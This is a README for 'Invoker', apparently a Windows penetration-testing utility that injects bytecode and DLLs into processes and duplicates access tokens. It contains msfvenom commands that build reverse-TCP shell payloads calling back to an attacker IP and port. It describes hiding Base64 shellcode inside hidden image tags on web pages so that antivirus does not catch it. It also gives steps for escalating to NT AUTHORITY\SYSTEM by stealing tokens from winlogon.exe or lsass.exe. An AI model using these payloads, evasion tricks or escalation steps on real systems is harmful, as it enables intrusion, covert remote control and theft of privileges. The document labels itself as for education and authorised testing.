# Invoker

Penetration testing utility.

**The goal is to use this tool when access to some Windows OS features through GUI is restricted.**

Capabilities:

* invoke the Command Prompt and PowerShell,
* download a file,
* schedule a task,
* add a registry key,
* connect to a remote host,
* terminate a running process,
* run a new process,
* inject bytecode into a running process,
* inject DLL into a running process,
* enable access token privileges,
* duplicate access token.

Built with Dev-C++ IDE v5.11 (64 bit), compiled with TDM-GCC v4.9.2 (64 bit) and tested on Windows 10 Enterprise OS (64 bit). Download Dev-C++ from [here](https://sourceforge.net/projects/orwelldevcpp/files/Portable%20Releases/).

Made for educational purposes. I hope it will help!

## Invoker Library

Check all the capabilities [here](https://github.com/ivan-sincek/invoker/tree/master/src/lib/invoker).

Feel free to use this library but please do not remove the license.

## PowerShell Scripts

Check all the PowerShell scripts used in the main C++ program [here](https://github.com/ivan-sincek/invoker/tree/master/ps).

## How to Run

Run ['\\exec\\Invoker.exe'](https://github.com/ivan-sincek/invoker/tree/master/exec).

## Bytecode Injection

Elevate privileges by injecting bytecode into a higher-privileged process.

This tool will parse any HTTP response received and look for the custom image element `<img class="bc" src="data:image/gif;base64,payload" alt="bc" hidden="hidden">` where `payload` is a binary code/file encoded in Base64.

With this you can hide your bytecode inside any legitimate web page in plain sight but you must strictly follow this format/rule.

This is very useful when antivirus is constantly deleting your local payloads.

You can also make your own custom element but don't forget to modify the program source code and recompile it.

Check an example at [pastebin.com/raw/Nd1tCBv6](https://pastebin.com/raw/Nd1tCBv6).

**Bytecode provided will most certainly not work for you.**

Bytecode was generated on Kali Linux v2020.1b (64 bit) with the following MSFvenom command (modify it to your need):

```fundamental
msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > /root/Desktop/payload.txt
```

To generate a binary file use the following MSFvenom command (modify it to your need):

```fundamental
msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o /root/Desktop/payload.bin
```

To generate a DLL file use the following MSFvenom command (modify it to your need):

```fundamental
msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o /root/Desktop/payload.dll
```

Bytecode might not work on the first try due to some other bad characters. Trial and error is the key.

## Get the LocalSystem Account (NT AUTHORITY\SYSTEM)

Run the Invoker.exe as administrator.

Enable all access token privileges.

Duplicate the access token from e.g. Windows Logon Application (winlogon.exe) and run a new instance of Invoker.exe.

Within the new Invoker.exe instance, open the Command Prompt and run `whoami`, you should now see `nt authority\system`.

Enable all access token privileges once again.

Close the previous instance of Invoker.exe.

P.S. You get more access token privileges from Local Security Authority Subsystem Service (lsass.exe).

## Images

![Invoker](https://github.com/ivan-sincek/invoker/blob/master/img/invoker.jpg)

![Registry](https://github.com/ivan-sincek/invoker/blob/master/img/registry.jpg)

![Injection](https://github.com/ivan-sincek/invoker/blob/master/img/injection.jpg)

![Shell](https://github.com/ivan-sincek/invoker/blob/master/img/shell.jpg)

![Privileges](https://github.com/ivan-sincek/invoker/blob/master/img/privileges.jpg)
